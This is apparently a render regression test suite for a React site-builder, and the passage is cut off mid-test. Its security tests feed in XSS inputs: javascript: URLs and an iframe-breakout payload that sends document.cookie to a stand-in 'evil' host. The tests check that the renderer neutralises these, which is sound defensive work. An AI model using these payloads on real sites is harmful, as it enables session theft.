import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement, Fragment } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { BuilderNodeRendererStyles, renderBuilderNodes } from "./render";
import type { BuilderNode } from "./types";
import { renderInlineRich } from "@/lib/site-admin/sections/shared/rich-text";
import { nodePresentationToBuilderStyle } from "./node-presentation-bridge";

function renderRich(input: string): string {
  return renderToStaticMarkup(
    createElement(Fragment, null, ...renderInlineRich(input)) as Parameters<
      typeof renderToStaticMarkup
    >[0],
  );
}

/**
 * Render-output regression suite — locks in that the builder's STYLE ESCAPES,
 * ENTRANCE ANIMATIONS, and Living-Components PHASE 3 resolution actually emit
 * the right CSS/markup through the real renderBuilderNodes path. Most of the
 * marathon's breadth was verified by throwaway renderToStaticMarkup scripts;
 * this makes those assertions permanent so a future change can't silently
 * regress the published render. Deterministic — no browser.
 */

function render(nodes: BuilderNode[], options: Parameters<typeof renderBuilderNodes>[1] = {}): string {
  return renderToStaticMarkup(
    renderBuilderNodes(nodes, {
      mode: "freeform",
      ...options,
    }) as Parameters<typeof renderToStaticMarkup>[0],
  );
}

function container(style: Record<string, unknown>): BuilderNode {
  return {
    id: "c1",
    kind: "container",
    props: { layout: "stack", style },
    children: [{ id: "h", kind: "heading", props: { text: "Hi", level: 2 } }],
  } as BuilderNode;
}

function countRendererStyles(html: string): number {
  return (html.match(/data-builder-node-renderer-styles/g) ?? []).length;
}

// ── Style escapes → CSS ───────────────────────────────────────────────────────

test("escapes: premium-2026 effect + interaction escapes emit correct CSS", () => {
  const html = render([
    container({
      clipPath: "circle(50%)",
      maskImage: "linear-gradient(#000,transparent)",
      textStroke: "1px #111",
      cursor: "grab",
      userSelect: "none",
      pointerEvents: "none",
      scrollSnapType: "x mandatory",
      scrollSnapAlign: "center",
    }),
  ]);
  for (const css of [
    "clip-path:circle(50%)",
    "cursor:grab",
    "scroll-snap-type:x mandatory",
    "scroll-snap-align:center",
    "pointer-events:none",
  ]) {
    assert.ok(html.includes(css), `expected ${css}`);
  }
  assert.ok(html.toLowerCase().includes("mask-image"), "mask-image");
  assert.ok(html.includes("text-stroke"), "-webkit-text-stroke");
  assert.ok(html.includes("user-select:none"), "user-select");
});

test("escapes: focus / form theming escapes emit correct CSS", () => {
  const html = render([
    container({
      outline: "2px solid #6366f1",
      outlineOffset: "2px",
      accentColor: "#ec4899",
      caretColor: "#111",
    }),
  ]);
  assert.ok(html.includes("outline:2px solid"), "outline");
  assert.ok(html.includes("outline-offset:2px"), "outline-offset");
  assert.ok(html.includes("accent-color"), "accent-color");
  assert.ok(html.includes("caret-color"), "caret-color");
});

test("escapes: surface + transform + blend escapes emit correct CSS", () => {
  const html = render([
    container({
      boxShadow: "0 8px 24px rgba(0,0,0,0.2)",
      opacity: 0.5,
      filter: "blur(2px)",
      backdropFilter: "blur(8px)",
      mixBlendMode: "multiply",
      rotate: "10deg",
      scale: "1.1",
      translate: "0 -4px",
      backgroundClip: "text",
    }),
  ]);
  for (const css of [
    "box-shadow:0 8px 24px",
    "opacity:0.5",
    "filter:blur(2px)",
    "mix-blend-mode:multiply",
    "rotate:10deg",
    "scale:1.1",
    "translate:0 -4px",
  ]) {
    assert.ok(html.includes(css), `expected ${css}`);
  }
  assert.ok(html.toLowerCase().includes("backdrop-filter"), "backdrop-filter");
});

test("transitions: longhands emit through renderer CSS vars", () => {
  const html = render([
    container({
      transitionProperty: "background-color, color",
      transitionDuration: "320ms",
      transitionTimingFunction: "cubic-bezier(.2,.8,.2,1)",
      transitionDelay: "40ms",
      responsive: {
        mobile: {
          transitionDuration: "120ms",
        },
      },
    }),
  ]);

  assert.ok(
    html.includes(
      ".site-builder-node[data-builder-style-transition]{transition-property:var(--bn-transition-property,all)",
    ),
    "static transition rule",
  );
  assert.ok(
    html.includes('data-builder-style-transition=""'),
    "base transition data gate",
  );
  assert.ok(
    html.includes('data-builder-style-mobile-transition=""'),
    "mobile transition data gate",
  );
  assert.ok(
    html.includes("--bn-transition-property:background-color, color"),
    "base property var",
  );
  assert.ok(html.includes("--bn-transition-duration:320ms"), "base duration");
  assert.ok(
    html.includes("--bn-transition-timing-function:cubic-bezier(.2,.8,.2,1)"),
    "base easing",
  );
  assert.ok(html.includes("--bn-transition-delay:40ms"), "base delay");
  assert.ok(
    html.includes("--bn-mobile-transition-duration:120ms"),
    "mobile duration",
  );
});

test("transitions: hover auto-default emits easing without a shorthand", () => {
  const html = render([
    container({
      hover: { backgroundColor: "#111" },
    }),
  ]);

  assert.ok(
    html.includes('data-builder-style-transition=""'),
    "hover arms transition gate",
  );
  assert.ok(html.includes("--bn-transition-property:all"), "default property");
  assert.ok(html.includes("--bn-transition-duration:.2s"), "default duration");
  assert.ok(!html.includes("transition:all .2s ease"), "no inline shorthand");
});

test("image mediaId resolves to the tenant media asset public URL", () => {
  const html = renderToStaticMarkup(
    renderBuilderNodes(
      [
        {
          id: "img1",
          kind: "image",
          props: {
            mediaId: "11111111-1111-4111-8111-111111111111",
            src: "https://example.com/fallback.jpg",
            alt: "",
          },
        },
      ],
      {
        mode: "freeform",
        dataSources: {
          mediaAssets: [
            {
              id: "11111111-1111-4111-8111-111111111111",
              publicUrl: "https://pluhdapdnuiulvxmyspd.supabase.co/storage/v1/object/public/media-public/tenant/a/library/photo.webp",
              alt: "Library portrait",
              width: 1200,
              height: 1600,
            },
          ],
        },
      },
    ) as Parameters<typeof renderToStaticMarkup>[0],
  );

  assert.ok(html.includes("photo.webp"), "resolved public URL");
  assert.ok(html.includes('alt="Library portrait"'), "asset alt fallback");
  assert.ok(
    html.includes('data-builder-media-id="11111111-1111-4111-8111-111111111111"'),
    "media id marker",
  );
  assert.ok(!html.includes("fallback.jpg"), "raw fallback should not win");
});

test("image mediaId falls back without rendering unsafe raw src", () => {
  const html = renderToStaticMarkup(
    renderBuilderNodes(
      [
        {
          id: "img1",
          kind: "image",
          props: {
            mediaId: "22222222-2222-4222-8222-222222222222",
            src: "javascript:alert(1)",
            alt: "Unsafe",
          },
        },
      ],
      { mode: "freeform", dataSources: { mediaAssets: [] } },
    ) as Parameters<typeof renderToStaticMarkup>[0],
  );

  assert.ok(!html.includes("<img"), "unsafe unresolved image is omitted");
  assert.ok(!html.includes("javascript:"), "unsafe src is never rendered");
});

test("container queries: query containers and slot-width overrides emit", () => {
  const html = render([
    {
      id: "slot",
      kind: "container",
      props: {
        layout: "stack",
        style: {
          containerType: "inline-size",
          containerName: "pricing-card",
        },
      },
      children: [
        {
          id: "copy",
          kind: "paragraph",
          props: {
            text: "Slot-aware copy",
            style: {
              containerQueries: {
                mobile: {
                  fontSize: "14px",
                  backgroundColor: "#f8fafc",
                  gridTemplateColumns: "1fr",
                },
              },
            },
          },
        },
      ],
    } as BuilderNode,
  ]);

  assert.ok(
    html.includes(
      ".site-builder-node[data-builder-style-container-type]{container-type:var(--bn-container-type)",
    ),
    "container-type static rule",
  );
  assert.ok(html.includes("--bn-container-type:inline-size"), "container type var");
  assert.ok(html.includes("--bn-container-name:pricing-card"), "container name var");
  assert.ok(html.includes("@container (max-width:640px)"), "mobile container query");
  assert.ok(
    html.includes('data-builder-style-cq-mobile-font-size=""'),
    "container mobile font-size gate",
  );
  assert.ok(
    html.includes("--bn-cq-mobile-font-size:14px"),
    "container mobile font-size var",
  );
  assert.ok(
    html.includes('data-builder-style-cq-mobile-bg-color=""'),
    "container mobile background gate",
  );
  assert.ok(
    html.includes("--bn-cq-mobile-bg-color:#f8fafc"),
    "container mobile background var",
  );
  assert.ok(
    html.includes('data-builder-style-cq-mobile-grid-template-columns=""'),
    "container mobile grid-template gate",
  );
  assert.ok(
    html.includes("--bn-cq-mobile-grid-template-columns:1fr"),
    "container mobile grid-template var",
  );
});

// ── Entrance animation ────────────────────────────────────────────────────────

test("animation: preset + easing resolution + scroll-driven timeline", () => {
  const html = render([
    container({
      animationPreset: "rise",
      animationDuration: "0.8s",
      animationEasing: "back",
      animationTrigger: "scroll",
    }),
  ]);
  assert.match(
    html,
    /animation:bn-anim-rise 0\.8s cubic-bezier\(0\.34, ?1\.56/,
    "rise + back-easing shorthand",
  );
  assert.ok(html.includes("view()"), "scroll-driven animation-timeline");
});

test("animation: all keyframes + reduced-motion guard ship in the static sheet", () => {
  const html = render([container({ animationPreset: "fade-in" })]);
  for (const kf of [
    "@keyframes bn-anim-fade-in",
    "@keyframes bn-anim-rise",
    "@keyframes bn-anim-zoom-in",
    "@keyframes bn-anim-flip-in",
    "@keyframes bn-anim-bounce-in",
  ]) {
    assert.ok(html.includes(kf), `expected ${kf}`);
  }
  assert.ok(html.includes("prefers-reduced-motion"), "reduced-motion guard");
});

// ── Wave 6B (#27) — interaction timeline: custom easing + scroll parallax ──────

test("animation: a custom easing curve wins over the named easing enum", () => {
  const html = render([
    container({
      animationPreset: "rise",
      animationDuration: "0.5s",
      animationEasing: "back", // would normally resolve to cubic-bezier(0.34,1.56,…)
      animationEasingCustom: "cubic-bezier(0.2, 0.8, 0.2, 1)",
    }),
  ]);
  assert.match(
    html,
    /animation:bn-anim-rise 0\.5s cubic-bezier\(0\.2, ?0\.8, ?0\.2, ?1\)/,
    "custom curve replaces the named easing in the animation shorthand",
  );
  // The "back" spring curve must NOT appear — custom fully overrides it.
  assert.ok(
    !html.includes("cubic-bezier(0.34, 1.56"),
    "named easing suppressed when custom set",
  );
});

test("animation: scroll parallax emits a baked keyframe on a view() timeline", () => {
  const html = render([container({ parallax: "medium" })]);
  assert.ok(
    /animation:bn-parallax-medium linear both/.test(html),
    "medium parallax animation shorthand",
  );
  assert.ok(html.includes("view()"), "parallax drives a scroll-driven timeline");
  // Parallax keyframes ship in the static sheet, reduced-motion-guarded.
  for (const kf of [
    "@keyframes bn-parallax-subtle",
    "@keyframes bn-parallax-medium",
    "@keyframes bn-parallax-strong",
  ]) {
    assert.ok(html.includes(kf), `expected ${kf}`);
  }
});

test("animation: parallax wins the single animation slot over the entrance preset", () => {
  const html = render([
    container({ animationPreset: "fade-in", parallax: "strong" }),
  ]);
  // Only the parallax animation should occupy the `animation` shorthand.
  assert.ok(
    html.includes("animation:bn-parallax-strong linear both"),
    "parallax animation present",
  );
  assert.ok(
    !html.includes("animation:bn-anim-fade-in"),
    "entrance preset does not also claim the animation slot",
  );
});

test("animation: parallax 'none' / undefined emits no parallax motion (back-compat)", () => {
  // The @keyframes definitions are always baked into the static sheet (like the
  // entrance keyframes); back-compat is about the NODE not getting an
  // `animation:bn-parallax-*` declaration when parallax is off/absent.
  const off = render([container({ parallax: "none" })]);
  assert.ok(
    !/animation:bn-parallax/.test(off),
    "parallax:none emits no animation declaration",
  );
  const bare = render([container({})]);
  assert.ok(
    !/animation:bn-parallax/.test(bare),
    "no parallax animation on an unstyled node",
  );
});

// ── Reveal-on-view (2026-06-04) — IntersectionObserver entry interaction ──────

test("reveal: revealOnView emits the data-bn-reveal attr + tuning vars + runtime", () => {
  const html = render([
    container({
      revealOnView: "fade-up",
      revealDistance: "48px",
      revealDuration: "0.8s",
      revealDelay: "120ms",
      revealEasing: "back",
    }),
  ]);
  assert.ok(html.includes('data-bn-reveal="fade-up"'), "direction attr emitted");
  assert.ok(html.includes("--bn-reveal-distance:48px"), "distance var emitted");
  assert.ok(html.includes("--bn-reveal-duration:0.8s"), "duration var emitted");
  assert.ok(html.includes("--bn-reveal-delay:120ms"), "delay var emitted");
  // `back` resolves to the named overshoot curve.
  assert.ok(
    html.includes("--bn-reveal-easing:cubic-bezier(0.34, 1.56, 0.64, 1)"),
    "easing var resolved from the named curve",
  );
  // The inline IntersectionObserver runtime ships once when a reveal is present.
  assert.ok(
    html.includes("data-builder-node-reveal-runtime"),
    "reveal runtime script emitted",
  );
  assert.ok(html.includes("IntersectionObserver"), "runtime uses IntersectionObserver");
  // The per-direction hidden-pose + reduced-motion guard live in the static sheet.
  assert.ok(html.includes("data-bn-reveal-armed"), "armed-state CSS present");
  assert.ok(html.includes("data-bn-revealed"), "revealed-state CSS present");
});

test("reveal: 'none' / undefined emits no reveal attr and no runtime (back-compat)", () => {
  const off = render([container({ revealOnView: "none" })]);
  // The per-direction selectors live in the static <style>; the back-compat
  // contract is that the NODE carries no reveal attr and no runtime ships. Strip
  // the stylesheet, then assert the rendered markup is reveal-free.
  const offMarkup = off.replace(/<style[\s\S]*?<\/style>/g, "");
  assert.ok(
    !offMarkup.includes("data-bn-reveal"),
    "reveal:none puts no reveal attr on the node",
  );
  assert.ok(
    !off.includes("data-builder-node-reveal-runtime"),
    "reveal:none emits no runtime",
  );
  const bare = render([container({})]);
  assert.ok(
    !bare.includes("data-builder-node-reveal-runtime"),
    "unstyled tree emits no reveal runtime (byte-stable)",
  );
});

// ── Wave 6B (#23) — sticky pinning convenience ────────────────────────────────

test("sticky: stickyAnchor 'top' emits position:sticky + top offset", () => {
  const html = render([
    container({ stickyAnchor: "top", stickyOffset: "16px" }),
  ]);
  assert.ok(html.includes("position:sticky"), "position:sticky emitted");
  assert.ok(html.includes("top:16px"), "top inset from stickyOffset");
});

test("sticky: stickyAnchor 'bottom' pins to the bottom edge", () => {
  const html = render([
    container({ stickyAnchor: "bottom", stickyOffset: "1rem" }),
  ]);
  assert.ok(html.includes("position:sticky"), "position:sticky emitted");
  assert.ok(html.includes("bottom:1rem"), "bottom inset from stickyOffset");
});

test("sticky: anchor with no offset defaults the inset to 0px", () => {
  const html = render([container({ stickyAnchor: "top" })]);
  assert.ok(html.includes("position:sticky"), "position:sticky emitted");
  assert.ok(html.includes("top:0px"), "default 0px inset");
});

test("sticky: an explicit position / top always wins over the convenience", () => {
  // Explicit position:relative must not be overridden to sticky; an explicit
  // top must not be overwritten by the offset. Raw escapes are authoritative.
  const html = render([
    container({
      stickyAnchor: "top",
      stickyOffset: "20px",
      position: "relative",
      top: "5px",
    }),
  ]);
  assert.ok(html.includes("position:relative"), "explicit position preserved");
  assert.ok(!html.includes("position:sticky"), "convenience did not force sticky");
  assert.ok(html.includes("top:5px"), "explicit top preserved");
  assert.ok(!html.includes("top:20px"), "offset did not clobber explicit top");
});

test("sticky: undefined sticky fields emit nothing (back-compat)", () => {
  const html = render([container({ position: "sticky", top: "0" })]);
  // The pre-existing position:sticky + top path is byte-stable; the new
  // convenience contributes no extra output when its fields are absent.
  assert.ok(html.includes("position:sticky"), "existing sticky path intact");
  assert.ok(html.includes("top:0"), "existing top intact");
});

// ── Renderer stylesheet de-duplication ───────────────────────────────────────

test("renderer css: standalone render remains self-contained", () => {
  const html = render([container({})]);
  assert.equal(countRendererStyles(html), 1);
  assert.ok(html.includes(".site-builder-node--container"), "static sheet");
});

test("renderer css: page-level sheet plus opt-out renders one style tag", () => {
  const first = renderBuilderNodes([container({})], {
    mode: "freeform",
    includeRendererStyles: false,
  });
  const second = renderBuilderNodes([container({ marginTop: "s" })], {
    mode: "freeform",
    includeRendererStyles: false,
  });
  const html = renderToStaticMarkup(
    createElement(Fragment, null, createElement(BuilderNodeRendererStyles), first, second),
  );

  assert.equal(countRendererStyles(html), 1);
  assert.ok(html.includes("data-builder-node-id=\"c1\""), "first section renders");
});

// -- Font loading --------------------------------------------------------------

test("font loading: node font families emit Google stylesheet links", () => {
  const html = renderToStaticMarkup(
    renderBuilderNodes(
      [
        container({
          fontFamily: '"Manrope", system-ui, sans-serif',
          responsive: {
            mobile: {
              fontFamily:
                '"IBM Plex Mono", ui-monospace, "SF Mono", Menlo, monospace',
            },
          },
          containerQueries: {
            tablet: {
              fontFamily: '"DM Sans", system-ui, sans-serif',
            },
          },
        }),
      ],
      {
        mode: "freeform",
        includeRendererStyles: false,
      },
    ) as Parameters<typeof renderToStaticMarkup>[0],
  );

  assert.ok(html.includes("data-builder-node-fonts"), "font link marker");
  assert.ok(
    html.includes("family=Manrope:wght@400;500;600;700"),
    "desktop family loaded",
  );
  assert.ok(
    html.includes("family=IBM+Plex+Mono:wght@400;500;700"),
    "responsive family loaded",
  );
  assert.ok(
    html.includes("family=DM+Sans:wght@400;500;700"),
    "container-query family loaded",
  );
  assert.equal(countRendererStyles(html), 0);
});

test("font loading: bundled Next fonts do not emit extra Google links", () => {
  const html = renderToStaticMarkup(
    renderBuilderNodes(
      [container({ fontFamily: '"Raleway", var(--font-body-sans), system-ui, sans-serif' })],
      {
        mode: "freeform",
        includeRendererStyles: false,
      },
    ) as Parameters<typeof renderToStaticMarkup>[0],
  );

  assert.ok(!html.includes("data-builder-node-fonts"), "no google link needed");
  assert.ok(html.includes("font-family:&quot;Raleway&quot;"), "font still renders");
});

// -- Node kinds ----------------------------------------------------------------

test("node kind: video renders hosted media with playback controls", () => {
  const html = render([
    {
      id: "video-1",
      kind: "video",
      props: {
        src: "https://cdn.example.com/demo.mp4",
        poster: "https://cdn.example.com/poster.jpg",
        autoplay: true,
        muted: true,
        loop: true,
        controls: true,
        style: {
          aspectRatio: "16:9",
          objectFit: "cover",
          borderRadius: "18px",
        },
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="video"'), "kind marker");
  assert.ok(html.includes('src="https://cdn.example.com/demo.mp4"'), "video src");
  assert.ok(html.includes('poster="https://cdn.example.com/poster.jpg"'), "poster");
  assert.ok(html.includes("autoPlay"), "autoplay");
  assert.ok(html.includes("muted"), "muted");
  assert.ok(html.includes("loop"), "loop");
  assert.ok(html.includes("controls"), "controls");
  assert.ok(html.includes("aspect-ratio:16 / 9"), "aspect ratio");
  assert.ok(html.includes("border-radius:18px"), "shared style");
});

test("node kind: embed renders a sandboxed iframe", () => {
  const html = render([
    {
      id: "embed-1",
      kind: "embed",
      props: {
        src: "https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ",
        title: "Launch film",
        provider: "youtube",
        allowFullScreen: true,
        style: { aspectRatio: "16:9" },
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="embed"'), "kind marker");
  assert.ok(html.includes('data-builder-embed-provider="youtube"'), "provider");
  assert.ok(
    html.includes('src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"'),
    "iframe src",
  );
  assert.ok(html.includes('title="Launch film"'), "title");
  assert.ok(html.includes("sandbox="), "sandboxed");
  assert.ok(html.includes("allow-forms"), "sandbox allows forms");
  assert.ok(html.includes("allowFullScreen"), "fullscreen enabled");
  assert.ok(html.includes("referrerPolicy"), "referrer policy set");
  assert.ok(html.includes("aspect-ratio:16 / 9"), "aspect ratio");
});

test("node kind: icon renders inline currentColor svg", () => {
  const html = render([
    {
      id: "icon-1",
      kind: "icon",
      props: {
        icon: "check",
        label: "Included",
        size: "lg",
        style: { textColor: "#0f766e" },
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="icon"'), "kind marker");
  assert.ok(html.includes('data-builder-icon="check"'), "icon marker");
  assert.ok(html.includes('role="img"'), "semantic icon");
  assert.ok(html.includes('aria-label="Included"'), "accessible label");
  assert.ok(html.includes('stroke="currentColor"'), "currentColor stroke");
  assert.ok(html.includes("font-size:3rem"), "size");
  assert.ok(html.includes("color:#0f766e"), "shared style color");
});

test("node kind: pricing_table renders responsive tiers with feature marks", () => {
  const html = render([
    {
      id: "pricing-1",
      kind: "pricing_table",
      props: {
        style: { gap: "24px" },
        tiers: [
          {
            id: "tier-basic",
            name: "Basic",
            description: "A lean launch package.",
            price: "$800",
            period: "project",
            ctaLabel: "Start basic",
            ctaHref: "/inquire",
            features: [
              { label: "Planning call" },
              { label: "Priority revisions", included: false },
            ],
          },
          {
            id: "tier-pro",
            name: "Pro",
            price: "$1,600",
            period: "project",
            ctaLabel: "Start pro",
            ctaHref: "/inquire?plan=pro",
            highlighted: true,
            features: [{ label: "Planning call" }],
          },
        ],
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="pricing_table"'), "kind marker");
  assert.ok(
    html.includes(".site-builder-node--pricing-table{width:100%"),
    "static pricing table CSS",
  );
  assert.ok(
    html.includes(".site-builder-node--pricing-table{grid-template-columns:1fr}"),
    "mobile stack rule",
  );
  assert.ok(html.includes("--bn-pricing-columns:2"), "column count var");
  assert.ok(html.includes("--bn-gap:24px"), "gap style override");
  assert.ok(html.includes('data-builder-pricing-highlighted="true"'), "highlight");
  assert.ok(html.includes('href="/inquire?plan=pro"'), "CTA href");
  assert.ok(html.includes('data-builder-feature-included="false"'), "excluded feature");
  assert.ok(html.includes("✓"), "check mark");
  assert.ok(html.includes("×"), "x mark");
});

test("security: embed sandbox never grants allow-same-origin (would defeat itself)", () => {
  const html = render([
    {
      id: "embed-sec",
      kind: "embed",
      props: { src: "https://player.vimeo.com/video/123", provider: "vimeo", style: {} },
    } as BuilderNode,
  ]);
  // allow-same-origin + allow-scripts together let framed content remove its own
  // sandbox attribute — they must never ship together.
  assert.ok(html.includes("allow-scripts"), "scripts allowed (players need it)");
  assert.ok(!html.includes("allow-same-origin"), "must NOT grant allow-same-origin");
});

test("node kind: rich_text renders annotations and sanitizes unsafe links", () => {
  const html = render([
    {
      id: "rich-1",
      kind: "rich_text",
      props: {
        text: "{b}Bold{/b} and {i}italic{/i} with [safe](https://example.com) plus [local](/directory) and [bad](javascript:alert(1)).",
        style: { textColor: "#111827" },
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="rich_text"'), "kind marker");
  assert.ok(html.includes("<strong>Bold</strong>"), "bold annotation");
  assert.ok(html.includes("<em>italic</em>"), "italic annotation");
  assert.ok(html.includes('href="https://example.com"'), "https link kept");
  assert.ok(html.includes('target="_blank"'), "external link target");
  assert.ok(html.includes('href="/directory"'), "relative link kept");
  assert.ok(html.includes("bad"), "unsafe label kept as text");
  assert.ok(!html.includes("javascript:alert"), "unsafe href removed");
  assert.ok(html.includes("color:#111827"), "shared style");
});

test("node kind: code renders an opaque-origin sandboxed iframe (scripts-only)", () => {
  const html = render([
    {
      id: "code-1",
      kind: "code",
      props: {
        html: '<h2>Widget</h2><p>hello</p>',
        minHeight: 200,
        style: { borderRadius: "12px" },
      },
    } as BuilderNode,
  ]);

  assert.ok(html.includes('data-builder-node-kind="code"'), "kind marker");
  // The ONLY sandbox token granted is allow-scripts — pairing it with
  // allow-same-origin (or top-nav / popups / forms) would let framed content
  // escape the box, so those must never appear.
  assert.ok(html.includes('sandbox="allow-scripts"'), "scripts-only sandbox");
  assert.ok(!html.includes("allow-same-origin"), "no allow-same-origin");
  assert.ok(!html.includes("allow-top-navigation"), "no top-navigation");
  assert.ok(!html.includes("allow-popups"), "no popups");
  assert.ok(!html.includes("allow-forms"), "no forms");
  assert.ok(!html.includes("allow-presentation"), "no presentation");
  // Author markup is delivered via the srcdoc attribute, never inlined.
  // (renderToStaticMarkup preserves the JSX prop casing `srcDoc`/`referrerPolicy`;
  // the browser lowercases them — either way it is the iframe srcdoc attribute.)
  assert.ok(html.includes("srcDoc="), "author HTML carried in srcdoc");
  assert.ok(html.includes('referrerPolicy="no-referrer"'), "no referrer leak");
  assert.ok(html.includes("min-height:200px"), "min-height floor applied");
  assert.ok(html.includes("border-radius:12px"), "shared style applied");
});

test("security: code node lets NO author script run in the parent origin", () => {
  // Worst case: author tries to break out of the srcdoc attribute, inject a
  // parent-level <script>, and steal the parent-scoped .tulala.digital cookie.
  const payload =
    '<script>document.title=document.cookie</script>' +
    '"></iframe><script>window.__PWNED__=1</script>' +
    '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';
  const html = render([
    { id: "code-evil", kind: "code", props: { html: payload } } as BuilderNode,
  ]);

  // 1) Exactly one iframe — the breakout `</iframe><script>` did NOT terminate
  //    our element and spill author nodes into the parent document.
  assert.equal((html.match(/<iframe/g) ?? []).length, 1, "single iframe, no breakout");
  // 2) No live script tag anywhere at parent level. React entity-encodes the
  //    whole srcdoc value, so every author `<` becomes `&lt;` — there is no
  //    parseable <script> in the parent document, only inert attribute text.
  assert.ok(!/<script/i.test(html), "no parent-level <script>");
  assert.ok(!html.includes('onerror="'), "no live onerror handler at parent level");
  // 3) The author's attribute-closing quote was neutralized: the whole
  //    `"></iframe>` breakout attempt is entity-encoded inside the srcdoc value,
  //    so it could not terminate the attribute or our element early.
  assert.ok(
    html.includes("&quot;&gt;&lt;/iframe&gt;"),
    "breakout attempt entity-encoded inside srcdoc",
  );
  assert.ok(html.includes("&quot;"), "author quotes entity-encoded");
  // 4) The payload survives — but only inside the srcdoc attribute, entity-
  //    encoded — proving it is data, parsed by the sandboxed frame, not the host.
  assert.ok(html.includes("&lt;script&gt;"), "author script preserved as inert text");
  assert.ok(html.includes('sandbox="allow-scripts"'), "still scripts-only sandbox");
  assert.ok(!html.includes("allow-same-origin"), "still no same-origin");
});

test("a11y: non-decorative icon without a label falls back to an accessible name", () => {
  const html = render([
    {
      id: "icon-no-label",
      kind: "icon",
      props: { icon: "check", decorative: false, style: {} },
    } as BuilderNode,
  ]);
  assert.ok(html.includes('role="img"'), "semantic icon");
  // role=img must never be nameless (WCAG 4.1.2) — fall back to the icon name.
  assert.ok(html.includes('aria-label="check"'), "accessible-name fallback");
});

// ── Data-binding repeaters + field bindings ─────────────────────────────────

function repeatCard(maxItems = 3): BuilderNode {
  return {
    id: "repeat",
    kind: "container",
    props: {
      layout: "grid",
      dataBinding: {
        sourceKey: "featured_talent_profiles",
        mode: "bound",
        repeat: true,
        maxItems,
      },
    },
    children: [
      {
        id: "card",
        kind: "card",
        props: {},
        children: [
          {
            id: "name",
            kind: "heading",
            props: {
              text: "Fallback name",
              level: 3,
              fieldBindings: { text: "displayName" },
            },
          },
          {
            id: "cta",
            kind: "button",
            props: {
              label: "Fallback CTA",
              href: "/fallback",
              fieldBindings: { label: "displayName", href: "href" },
            },
          },
          {
            id: "photo",
            kind: "image",
            props: {
              src: "https://cdn.example.com/fallback.jpg",
              alt: "Fallback alt",
              fieldBindings: { src: "imageUrl", alt: "displayName" },
            },
          },
        ],
      },
    ],
  } as BuilderNode;
}

test("repeaters: container template emits one clone per collection item", () => {
  const html = render([repeatCard()], {
    dataSources: {
      collections: {
        featured_talent_profiles: [
          { id: "talent-1", displayName: "Ana", href: "/t/ana", imageUrl: "/assets/ana.jpg" },
          { id: "talent-2", displayName: "Bea", href: "/t/bea", imageUrl: "/assets/bea.jpg" },
          { id: "talent-3", displayName: "Cleo", href: "/t/cleo", imageUrl: "/assets/cleo.jpg" },
        ],
      },
    },
  });

  assert.equal((html.match(/data-builder-node-kind="card"/g) ?? []).length, 3);
  assert.ok(html.includes("repeat__repeat_talent-1-1__card"), "stable item namespace");
  assert.ok(html.includes(">Ana<") && html.includes(">Bea<") && html.includes(">Cleo<"));
  assert.ok(html.includes('href="/t/ana"'), "bound href kept after allowlist");
  assert.ok(html.includes('src="/assets/ana.jpg"'), "bound image src kept after validation");
  assert.ok(!html.includes("Fallback name"), "field binding replaces design text");
});

test("repeaters: maxItems limits resolved collection output", () => {
  const html = render([repeatCard(1)], {
    dataSources: {
      collections: {
        featured_talent_profiles: [
          { id: "talent-1", displayName: "Ana" },
          { id: "talent-2", displayName: "Bea" },
        ],
      },
    },
  });

  assert.ok(html.includes(">Ana<"));
  assert.ok(!html.includes(">Bea<"));
});

test("container display:slider emits per-breakpoint display attrs + items-per-view vars", () => {
  const node: BuilderNode = {
    id: "slider-c",
    kind: "container",
    props: {
      layout: "grid",
      columns: 4,
      itemsPerView: 3,
      responsive: {
        mobile: { layout: "grid", columns: 2, display: "slider", itemsPerView: 2 },
      },
    },
    children: [
      { id: "sa", kind: "heading", props: { text: "A", level: 2 } },
      { id: "sb", kind: "heading", props: { text: "B", level: 2 } },
    ],
  } as BuilderNode;
  const html = render([node]);
  assert.ok(
    html.includes('data-builder-mobile-display="slider"'),
    "mobile display attr emitted",
  );
  assert.match(html, /--bn-items-per-view:\s*3/, "base items-per-view var emitted");
  assert.match(
    html,
    /--bn-mobile-items-per-view:\s*2/,
    "mobile items-per-view var emitted",
  );
});

test("hero carousel: first freeform slide background renders as an eager priority <img>", () => {
  const node: BuilderNode = {
    id: "hero-c",
    kind: "carousel",
    props: { variant: "hero", heightMode: "fixed", minHeightPx: 400 },
    children: [
      {
        id: "hs0",
        kind: "container",
        props: {
          layout: "stack",
          style: {
            backgroundImage:
              "url('/talent-templates/demo/impronta-2026/lifestyle-1.jpg')",
            backgroundPosition: "center top",
          },
        },
        children: [
          { id: "hh0", kind: "heading", props: { text: "Faces with an imprint", level: 1 } },
        ],
      },
      {
        id: "hs1",
        kind: "container",
        props: {
          layout: "stack",
          style: {
            backgroundImage:
              "url('/talent-templates/demo/impronta-2026/lifestyle-2.jpg')",
          },
        },
        children: [{ id: "hh1", kind: "heading", props: { text: "More faces", level: 2 } }],
      },
    ],
  } as BuilderNode;
  const html = render([node]);
  // Slide 0's photo must paint as a real prioritized <img> (LCP + alt), not a
  // CSS background — the others stay CSS background (no second eager <img>).
  assert.match(html, /loading="eager"/, "first hero slide ships an eager <img>");
  assert.match(html, /fetchpriority="high"/i, "first hero slide image is high priority (LCP)");
  assert.ok(/alt="[^"]*\S[^"]*"/.test(html), "first hero slide image has a non-empty alt");
  assert.equal(
    (html.match(/loading="eager"/g) ?? []).length,
    1,
    "only the first slide is eager",
  );
});

test("repeaters: empty source renders the template once as static fallback", () => {
  const html = render([repeatCard()], {
    dataSources: { collections: { featured_talent_profiles: [] } },
  });

  assert.equal((html.match(/data-builder-node-kind="card"/g) ?? []).length, 1);
  assert.ok(html.includes("Fallback name"), "template remains visible");
});

test("repeaters: bound javascript href is dropped", () => {
  const html = render([repeatCard()], {
    dataSources: {
      collections: {
        featured_talent_profiles: [
          {
            id: "talent-1",
            displayName: "Unsafe",
            href: "javascript:alert(1)",
            imageUrl: "/assets/safe.jpg",
          },
        ],
      },
    },
  });

  assert.ok(html.includes(">Unsafe<"), "bound label still renders as text");
